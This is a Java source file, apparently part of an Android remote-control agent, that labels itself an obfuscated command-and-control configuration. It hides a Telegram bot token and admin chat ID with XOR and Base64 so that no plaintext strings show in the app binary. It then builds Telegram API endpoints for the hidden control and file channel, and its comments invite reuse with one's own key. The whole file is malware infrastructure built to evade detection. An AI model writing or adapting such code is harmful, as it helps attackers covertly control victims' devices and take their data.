// language: Java, file: Config.java, target: Android API 26+
// *obfuscated C2 config — XOR + Base64, no plaintext strings in dex*
package com.rk.agent;

import android.util.Base64;

public final class Config {

    // XOR key — change this to your own random string
    private static final byte[] K = {
        (byte)0x5A, (byte)0x3C, (byte)0x91, (byte)0xE7,
        (byte)0x2D, (byte)0x88, (byte)0x41, (byte)0xB6,
        (byte)0x17, (byte)0xC3, (byte)0x6F, (byte)0x9A,
        (byte)0xD4, (byte)0x22, (byte)0x7B, (byte)0x05
    };

    // === Encrypted blobs (regenerate with encrypt.sh) ===
    // BOT_TOKEN
    private static final String T_B64 = "YgSp0x28dY8j8FXblWcRQitQ5KVe7AXSQYs+8OUXPXcMDN2Ib/AH23ihNum5RQ==";
    // ADMIN_CHAT_ID
    private static final String C_B64 = "bQ6g1B+5c4Qv8w==";

    public static String botToken() {
        return dec(T_B64);
    }

    public static String adminChatId() {
        return dec(C_B64);
    }

    public static String apiBase() {
        return "https://api.telegram.org/bot" + botToken() + "/";
    }

    public static String fileBase() {
        return "https://api.telegram.org/file/bot" + botToken() + "/";
    }

    private static String dec(String b64) {
        try {
            byte[] data = Base64.decode(b64, Base64.NO_WRAP);
            byte[] out = new byte[data.length];
            for (int i = 0; i < data.length; i++) {
                out[i] = (byte)(data[i] ^ K[i % K.length]);
            }
            return new String(out, "UTF-8");
        } catch (Exception e) {
            return "";
        }
    }
}
